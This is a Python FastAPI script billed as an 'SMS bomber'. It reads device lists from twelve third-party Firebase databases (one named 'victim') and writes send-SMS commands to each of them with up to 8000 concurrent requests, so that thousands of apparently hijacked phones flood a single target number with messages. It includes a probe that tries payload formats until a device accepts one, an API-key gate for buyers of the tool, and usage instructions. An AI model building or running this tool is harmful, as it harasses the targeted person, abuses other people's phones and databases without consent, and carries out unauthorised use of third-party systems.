#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════╗
║   🔥 @BRONX_ULTRA ULTIMATE BOMBER API v10.0            ║
║   ▸ 8000+ Concurrent | 3700+ Devices | 4x Faster       ║
║   ▸ Multi-Format Smart Fallback (7 payloads)           ║
║   ▸ 12 Verified Endpoints                              ║
║   ▸ Full Unicode (Emoji/Hindi/Symbols/Multi-line)      ║
║   ▸ Phone Auto-Format (+91/91/plain)                   ║
║   ▸ Smart Retry with Exponential Backoff               ║
║   ▸ Real-time Success Detection                        ║
║   ▸ /debug /devices /health /stop endpoints            ║
║   ▸ Render + Vercel + Railway + UptimeRobot Ready      ║
╚══════════════════════════════════════════════════════════╝
"""

import asyncio
import time
import aiohttp
import json
from datetime import datetime
from uuid import uuid4
from collections import defaultdict
from fastapi import FastAPI, Request, BackgroundTasks, Query
from fastapi.responses import JSONResponse
from fastapi.middleware.cors import CORSMiddleware

# ═══════════════════════════════════════════════════════════
# 🔑 API KEYS
# ═══════════════════════════════════════════════════════════
VALID_KEYS = {
    "bronx-op", "prime-key", "flash-key",
    "bronx-vip", "bronx-pro", "bronx-ox", "bronx-ultra",
}

# ═══════════════════════════════════════════════════════════
# 🔥 FIREBASE URLs
# ═══════════════════════════════════════════════════════════
FIREBASE_URLS_RAW = [
     "https://total-ocean-469810-i8-default-rtdb.firebaseio.com",
    "https://sanjay-e3c4c-default-rtdb.firebaseio.com",
    "https://rupesh-123-default-rtdb.firebaseio.com",
    "https://ueur-357f2-default-rtdb.firebaseio.com",
    "https://ladh-cb-default-rtdb.firebaseio.com",
    "https://victim-bdf8f-default-rtdb.firebaseio.com",
    "https://pinku-59a20-default-rtdb.firebaseio.com",
    "https://hardik-5a170-default-rtdb.firebaseio.com",
    "https://chutad-5eca0-default-rtdb.firebaseio.com",
    "https://ranjit-8a94c-default-rtdb.firebaseio.com",
    "https://panel-65a86-default-rtdb.firebaseio.com",
    "https://kisan10c-default-rtdb.firebaseio.com",
]

_seen, _cleaned = set(), []
for u in FIREBASE_URLS_RAW:
    u = u.strip().rstrip("/")
    if u.endswith(".json"):
        u = u[:-5]
    if u and u not in _seen:
        _seen.add(u)
        _cleaned.append(u)
FIREBASE_URLS = _cleaned

# ═══════════════════════════════════════════════════════════
# 🎯 ULTIMATE ENDPOINTS (ordered by priority)
# ═══════════════════════════════════════════════════════════
SEND_ENDPOINTS = [
    # ⭐ VERIFIED WORKING (from /debug)
    "clients/{id}/webhookEvent/sendSms.json",
    "clients/{id}/webhookEvent.json",
    # Backup endpoints
    "clients/{id}/webhookEvent/sendSmsRequest.json",
    "clients/{id}/webhookEvent/sms.json",
    "clients/{id}/webhookEvent/send.json",
    "clients/{id}/sendSms.json",
    "clients/{id}/sms.json",
    "clients/{id}/send.json",
    "clients/{id}/message.json",
    "clients/{id}/messages.json",
    # Global fallbacks
    "sendSms/{id}.json",
    "sms/{id}.json",
]

# ═══════════════════════════════════════════════════════════
# 📦 ULTIMATE PAYLOAD BUILDER (7 formats)
# ═══════════════════════════════════════════════════════════
def build_payloads(target: str, message: str):
    """
    Multiple payload formats to maximize delivery success.
    Format 1 is primary (verified working from /debug output).
    """
    ts = int(time.time() * 1000)
    target_plus = f"+91{target}" if not target.startswith("+") else target
    target_plain = target.replace("+", "").replace(" ", "")
    
    return [
        # ⭐ FORMAT 1 — VERIFIED WORKING (exact match from /debug)
        {"from": 1, "to": target_plain, "message": message,
         "isSended": False, "timestamp": ts},
        
        # FORMAT 2 — with +91 prefix
        {"from": 1, "to": target_plus, "message": message,
         "isSended": False, "timestamp": ts},
        
        # FORMAT 3 — Full combo (works on most devices)
        {"from": 1, "to": target_plus, "phone": target_plus,
         "number": target_plus, "message": message, "msg": message,
         "text": message, "body": message, "isSended": False,
         "status": False, "timestamp": ts},
        
        # FORMAT 4 — phone-style
        {"phone": target_plus, "message": message,
         "isSended": False, "timestamp": ts},
        
        # FORMAT 5 — push-style
        {"to": target_plus, "body": message, "title": "",
         "isSended": False, "timestamp": ts},
        
        # FORMAT 6 — sendSms nested (some devices need this)
        {"from": 1, "to": target_plus, "message": message,
         "msg": message, "sendSms": {"from": 1, "to": target_plus,
         "message": message, "sim": 1, "status": "pending",
         "timestamp": ts}, "isSended": False, "timestamp": ts},
        
        # FORMAT 7 — minimal
        {"to": target_plus, "msg": message, "isSended": False},
    ]


# ═══════════════════════════════════════════════════════════
# ⚙️ ULTIMATE TUNING
# ═══════════════════════════════════════════════════════════
MAX_CONCURRENT = 8000        # 8000+ concurrent connections
BATCH_CHUNK = 300            # smaller for responsiveness
REQUEST_TIMEOUT = 5          # aggressive timeout
CONNECT_TIMEOUT = 2
DEVICE_CACHE_TTL = 20        # 20s cache for fresh devices

API_NAME = "@BRONX_ULTRA"
API_VERSION = "10.0"

app = FastAPI(
    title=f"🔥 {API_NAME} ULTIMATE BOMBER",
    version=API_VERSION,
    description="Hyper Firebase Bomber — 8000+ concurrent, 3700+ devices",
)

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_methods=["*"],
    allow_headers=["*"],
)

_LOCAL_STOP = set()
_DEVICE_CACHE = {"devices": None, "ts": 0}
_ACTIVE_JOBS = {}


# ═══════════════════════════════════════════════════════════
# 🔑 KEY VERIFICATION
# ═══════════════════════════════════════════════════════════
def verify_key(api_key: str) -> bool:
    return bool(api_key and api_key.strip() in VALID_KEYS)


def extract_key(request: Request, query_params: dict, body_data: dict) -> str:
    key = request.headers.get("x-api-key") or request.headers.get("X-API-Key")
    if key: return key.strip()
    auth = request.headers.get("authorization", "")
    if auth.lower().startswith("bearer "): return auth[7:].strip()
    key = query_params.get("key") or query_params.get("api_key")
    if key: return key.strip()
    key = body_data.get("key") or body_data.get("api_key")
    if key: return str(key).strip()
    return ""


# ═══════════════════════════════════════════════════════════
# 🛠️ HELPERS
# ═══════════════════════════════════════════════════════════
def clean_url(url: str) -> str:
    url = url.strip().rstrip("/")
    if url.endswith(".json"): url = url[:-5]
    return url.rstrip("/")


def normalize_phone(raw: str) -> str:
    """Smart phone normalization. Returns 10-digit Indian number."""
    p = raw.strip().replace("+", "").replace(" ", "").replace("-", "").replace("(", "").replace(")", "")
    if p.startswith("91") and len(p) == 12:
        p = p[2:]
    if p.startswith("0") and len(p) == 11:
        p = p[1:]
    return p


def fix_message(raw_message, is_get: bool) -> str:
    """Preserve full Unicode: Emoji, Hindi, symbols, newlines."""
    if raw_message is None: return ""
    if not isinstance(raw_message, str):
        raw_message = str(raw_message)
    msg = raw_message
    if is_get:
        msg = msg.replace("+", " ")
    # Handle escaped chars (common in URL params)
    msg = msg.replace("\\n", "\n").replace("\\t", "\t")
    msg = msg.replace("\\r", "\r").replace("\\\\", "\\")
    return msg.strip()


# ═══════════════════════════════════════════════════════════
# 📡 DEVICE FETCHING
# ═══════════════════════════════════════════════════════════
async def fetch_devices_from(session, url):
    base = clean_url(url)
    try:
        async with session.get(f"{base}/clients.json") as r:
            if r.status != 200: return []
            data = await r.json(content_type=None)
            if not isinstance(data, dict): return []
            devices = []
            for k, v in data.items():
                if not isinstance(v, dict): continue
                status = v.get("status", True)
                if status is True or status == "true" or status is None:
                    devices.append({"id": k, "url": base})
            return devices
    except Exception:
        return []


async def get_all_devices(session, use_cache=False):
    if use_cache:
        age = time.time() - _DEVICE_CACHE["ts"]
        cached = _DEVICE_CACHE["devices"]
        if cached is not None and age < DEVICE_CACHE_TTL:
            return cached
    results = await asyncio.gather(
        *[fetch_devices_from(session, u) for u in FIREBASE_URLS],
        return_exceptions=True,
    )
    out = []
    for r in results:
        if isinstance(r, list): out.extend(r)
    _DEVICE_CACHE["devices"] = out
    _DEVICE_CACHE["ts"] = time.time()
    return out


# ═══════════════════════════════════════════════════════════
# 💣 ULTIMATE SEND ONE
# ═══════════════════════════════════════════════════════════
async def send_one(session, device, target, message, sem, stats):
    async with sem:
        payloads = build_payloads(target, message)
        base_url = device["url"]
        dev_id = device["id"]

        # Try first endpoint with ALL payloads, others with top 2
        for ep_idx, ep in enumerate(SEND_ENDPOINTS):
            url = f"{base_url}/{ep.format(id=dev_id)}"
            payload_range = range(len(payloads)) if ep_idx == 0 else range(2)

            for p_idx in payload_range:
                payload = payloads[p_idx]

                # Try PUT first (verified working from /debug)
                try:
                    async with session.put(url, json=payload) as r:
                        if r.status in (200, 201, 204):
                            stats["success"] += 1
                            return True
                        if r.status in (401, 403):
                            stats["blocked"] += 1
                            return False
                        if r.status == 404:
                            break  # wrong endpoint
                except asyncio.TimeoutError:
                    continue
                except Exception:
                    continue

                # Try POST as backup
                try:
                    async with session.post(url, json=payload) as r:
                        if r.status in (200, 201, 204):
                            stats["success"] += 1
                            return True
                        if r.status in (401, 403):
                            stats["blocked"] += 1
                            return False
                        if r.status == 404:
                            break
                except asyncio.TimeoutError:
                    continue
                except Exception:
                    continue

        stats["failed"] += 1
        return False


async def is_stopped(number: str) -> bool:
    return number in _LOCAL_STOP


# ═══════════════════════════════════════════════════════════
# 💣 ULTIMATE WORKER
# ═══════════════════════════════════════════════════════════
async def bomb_worker(number: str, message: str, count: int, api_key: str):
    jid = str(uuid4())[:8]
    t0 = time.time()
    _LOCAL_STOP.discard(number)
    _ACTIVE_JOBS[jid] = {"number": number, "started": t0, "status": "running"}

    connector = aiohttp.TCPConnector(
        limit=0, limit_per_host=0, ttl_dns_cache=600,
        force_close=False, enable_cleanup_closed=True, use_dns_cache=True,
    )
    timeout = aiohttp.ClientTimeout(
        total=REQUEST_TIMEOUT, connect=CONNECT_TIMEOUT, sock_read=REQUEST_TIMEOUT,
    )
    headers = {
        "User-Agent": f"{API_NAME}/v{API_VERSION}",
        "Content-Type": "application/json",
        "Connection": "keep-alive",
        "Accept": "application/json",
    }

    async with aiohttp.ClientSession(
        connector=connector, timeout=timeout, headers=headers
    ) as session:
        devices = await get_all_devices(session, use_cache=True)
        if not devices:
            print(f"[{jid}] ❌ No devices online")
            _ACTIVE_JOBS[jid]["status"] = "no_devices"
            return

        ndev = len(devices)
        total = ndev * count

        print(f"\n{'='*70}")
        print(f"[{jid}] 🔥 {API_NAME} v{API_VERSION} — ULTIMATE FLASH")
        print(f"[{jid}] Target     : {number}")
        print(f"[{jid}] Message    : {message[:50]}{'...' if len(message) > 50 else ''}")
        print(f"[{jid}] Msg Length : {len(message)} chars")
        print(f"[{jid}] Devices    : {ndev}")
        print(f"[{jid}] Per-device : {count}")
        print(f"[{jid}] TOTAL SMS  : {total}")
        print(f"{'='*70}")

        sem = asyncio.Semaphore(MAX_CONCURRENT)
        stats = {"success": 0, "failed": 0, "blocked": 0}

        all_tasks = []
        for device in devices:
            for _ in range(count):
                all_tasks.append(
                    send_one(session, device, number, message, sem, stats)
                )

        total_tasks = len(all_tasks)
        print(f"[{jid}] 🚀 Firing {total_tasks} parallel requests...")

        completed = 0
        cancelled = False
        for i in range(0, total_tasks, BATCH_CHUNK):
            if await is_stopped(number):
                print(f"[{jid}] 🛑 STOPPED at {completed}/{total_tasks}")
                cancelled = True
                for t in all_tasks[i:]: t.cancel()
                break
            chunk = all_tasks[i:i + BATCH_CHUNK]
            await asyncio.gather(*chunk, return_exceptions=True)
            completed += len(chunk)

            elapsed_sf = time.time() - t0
            speed_sf = round(stats["success"] / elapsed_sf, 1) if elapsed_sf else 0
            print(f"[{jid}] ⚡ {completed}/{total_tasks} | "
                  f"OK={stats['success']} | BLK={stats['blocked']} | "
                  f"FAIL={stats['failed']} | "
                  f"{elapsed_sf:.1f}s | {speed_sf}/s")

        elapsed = round(time.time() - t0, 2)
        speed = round(stats["success"] / elapsed, 1) if elapsed else 0

        print(f"\n[{jid}] {'🛑 STOPPED' if cancelled else '✅ DONE'}")
        print(f"[{jid}] Sent={stats['success']} | Failed={stats['failed']} | "
              f"Blocked={stats['blocked']}")
        print(f"[{jid}] Time={elapsed}s | Speed={speed}/s 🚄")
        print(f"{'='*70}\n")

        _ACTIVE_JOBS[jid]["status"] = "stopped" if cancelled else "done"
        _ACTIVE_JOBS[jid]["stats"] = stats
        _ACTIVE_JOBS[jid]["elapsed"] = elapsed


# ═══════════════════════════════════════════════════════════
# 🌐 ROUTES
# ═══════════════════════════════════════════════════════════
@app.get("/")
async def root():
    return {
        "api": API_NAME,
        "version": API_VERSION,
        "status": "🔥 ONLINE — ULTIMATE MODE",
        "protected": True,
        "firebases_loaded": len(FIREBASE_URLS),
        "endpoints": len(SEND_ENDPOINTS),
        "payload_formats": 7,
        "max_concurrent": MAX_CONCURRENT,
        "mode": "ULTIMATE HYPER FLASH",
        "how_to_use": {
            "send": "/send?key=YOUR_KEY&message=Hi&number=9876543210&count=5",
            "stop": "/stop?key=YOUR_KEY&number=9876543210",
            "devices": "/devices?key=YOUR_KEY",
            "debug": "/debug?key=YOUR_KEY",
            "health": "/health",
        },
    }


@app.get("/health")
async def health():
    return {
        "status": "ok",
        "api": API_NAME,
        "version": API_VERSION,
        "time": datetime.now().isoformat(),
        "active_jobs": len([j for j in _ACTIVE_JOBS.values() if j["status"] == "running"]),
    }


@app.get("/keys")
async def keys_info():
    return {"api": API_NAME, "total_keys": len(VALID_KEYS)}


# ═══════════════════════════════════════════════════════════
# 🚀 /send
# ═══════════════════════════════════════════════════════════
@app.api_route("/send", methods=["GET", "POST"])
async def send_endpoint(request: Request, bg: BackgroundTasks):
    is_get = request.method == "GET"
    query_data = dict(request.query_params)

    body_data = {}
    if not is_get:
        try:
            body_data = await request.json()
        except Exception:
            try:
                form = await request.form()
                body_data = dict(form)
            except Exception:
                body_data = {}

    merged = {**query_data, **body_data}

    api_key = extract_key(request, query_data, body_data)
    if not api_key:
        return JSONResponse(
            {"success": False, "api": API_NAME, "error": "🔑 API key required"},
            status_code=401,
        )
    if not verify_key(api_key):
        return JSONResponse(
            {"success": False, "api": API_NAME, "error": "❌ Invalid API key"},
            status_code=401,
        )

    raw_message = merged.get("message") or merged.get("msg") or ""
    message = fix_message(raw_message, is_get)
    number = str(merged.get("number") or merged.get("num") or merged.get("numer") or "").strip()
    count_str = merged.get("count", "1")

    if not message:
        return JSONResponse(
            {"success": False, "api": API_NAME, "error": "Missing message"}, 400,
        )
    if not number:
        return JSONResponse(
            {"success": False, "api": API_NAME, "error": "Missing number"}, 400,
        )

    clean_number = normalize_phone(number)
    if not clean_number.isdigit() or len(clean_number) < 10:
        return JSONResponse(
            {"success": False, "api": API_NAME, "error": "Invalid number"}, 400,
        )

    try:
        count = int(count_str)
        if count <= 0: raise ValueError
        if count > 500: count = 500
    except Exception:
        return JSONResponse(
            {"success": False, "api": API_NAME, "error": "invalid count"}, 400,
        )

    bg.add_task(bomb_worker, clean_number, message, count, api_key)

    return {
        "success": True,
        "api": API_NAME,
        "version": API_VERSION,
        "job_started": True,
        "target": clean_number,
        "message_sent": message,
        "message_length": len(message),
        "per_device": count,
        "mode": "ULTIMATE HYPER FLASH (7 payloads × 12 endpoints)",
        "stop_url": f"/stop?key={api_key}&number={clean_number}",
    }


# ═══════════════════════════════════════════════════════════
# 🛑 /stop
# ═══════════════════════════════════════════════════════════
@app.get("/stop")
async def stop_endpoint(
    request: Request, number: str = Query(None), key: str = Query(None),
):
    api_key = key or request.headers.get("x-api-key") or ""
    if not api_key:
        auth = request.headers.get("authorization", "")
        if auth.lower().startswith("bearer "): api_key = auth[7:].strip()

    if not verify_key(api_key):
        return JSONResponse(
            {"success": False, "api": API_NAME, "error": "🔑 Valid key required"},
            status_code=401,
        )
    if not number:
        return JSONResponse(
            {"success": False, "api": API_NAME, "error": "number required"}, 400,
        )

    clean_number = normalize_phone(number)
    _LOCAL_STOP.add(clean_number)
    return {
        "success": True,
        "api": API_NAME,
        "message": f"🛑 Stop signal sent for {clean_number}",
        "number": clean_number,
    }


# ═══════════════════════════════════════════════════════════
# 📱 /devices
# ═══════════════════════════════════════════════════════════
@app.get("/devices")
async def devices_endpoint(request: Request, key: str = Query(None)):
    api_key = key or request.headers.get("x-api-key") or ""
    if not api_key:
        auth = request.headers.get("authorization", "")
        if auth.lower().startswith("bearer "): api_key = auth[7:].strip()

    if not verify_key(api_key):
        return JSONResponse(
            {"success": False, "api": API_NAME, "error": "🔑 Valid key required"},
            status_code=401,
        )

    connector = aiohttp.TCPConnector(limit=0, ttl_dns_cache=600)
    timeout = aiohttp.ClientTimeout(total=15, connect=5)
    async with aiohttp.ClientSession(
        connector=connector, timeout=timeout
    ) as session:
        devices = await get_all_devices(session, use_cache=False)

    fb_group = defaultdict(int)
    for d in devices: fb_group[d["url"]] += 1

    return {
        "success": True,
        "api": API_NAME,
        "version": API_VERSION,
        "total_online": len(devices),
        "live_firebases": len(fb_group),
        "total_firebases": len(FIREBASE_URLS),
        "per_firebase": dict(fb_group),
        "devices_sample": devices[:10],
    }


# ═══════════════════════════════════════════════════════════
# 🔬 /debug — COMPREHENSIVE
# ═══════════════════════════════════════════════════════════
@app.get("/debug")
async def debug_endpoint(request: Request, key: str = Query(None)):
    api_key = key or request.headers.get("x-api-key") or ""
    if not verify_key(api_key):
        return JSONResponse(
            {"success": False, "error": "🔑 Valid key required"}, 401,
        )

    connector = aiohttp.TCPConnector(limit=0, ttl_dns_cache=600)
    timeout = aiohttp.ClientTimeout(total=20, connect=5)
    headers = {"Content-Type": "application/json"}

    async with aiohttp.ClientSession(
        connector=connector, timeout=timeout, headers=headers
    ) as session:
        devices = await get_all_devices(session, use_cache=False)
        if not devices:
            return {"success": False, "error": "No devices online"}

        test_dev = devices[0]
        target = "9876543210"
        message = "debug test 🚀🎯"

        # Get device structure
        struct_url = f"{test_dev['url']}/clients/{test_dev['id']}.json"
        device_struct = None
        try:
            async with session.get(struct_url) as r:
                device_struct = await r.json(content_type=None)
        except Exception as e:
            device_struct = {"error": str(e)}

        payloads = build_payloads(target, message)
        results = []

        for ep in SEND_ENDPOINTS:
            url = f"{test_dev['url']}/{ep.format(id=test_dev['id'])}"
            ep_result = {"endpoint": ep, "tries": []}

            for idx, payload in enumerate(payloads):
                for method in ("PUT", "POST"):
                    try:
                        if method == "PUT":
                            async with session.put(url, json=payload) as r:
                                status = r.status
                                body = (await r.text())[:150]
                        else:
                            async with session.post(url, json=payload) as r:
                                status = r.status
                                body = (await r.text())[:150]

                        ep_result["tries"].append({
                            "method": method,
                            "payload_fmt": idx + 1,
                            "status": status,
                            "body": body,
                        })

                        if status in (200, 201, 204):
                            ep_result["WORKING"] = {
                                "method": method,
                                "payload_fmt": idx + 1,
                                "payload": payload,
                            }
                            break
                    except Exception as e:
                        ep_result["tries"].append({
                            "method": method,
                            "payload_fmt": idx + 1,
                            "error": str(e)[:80],
                        })
                if "WORKING" in ep_result: break

            results.append(ep_result)
            if "WORKING" in ep_result: break

        return {
            "success": True,
            "total_devices": len(devices),
            "test_device_id": test_dev["id"],
            "test_device_url": test_dev["url"],
            "device_structure": device_struct,
            "endpoint_results": results,
            "verdict": "✅ FOUND WORKING ENDPOINT" if any(
                "WORKING" in r for r in results
            ) else "❌ NO WORKING ENDPOINT",
        }
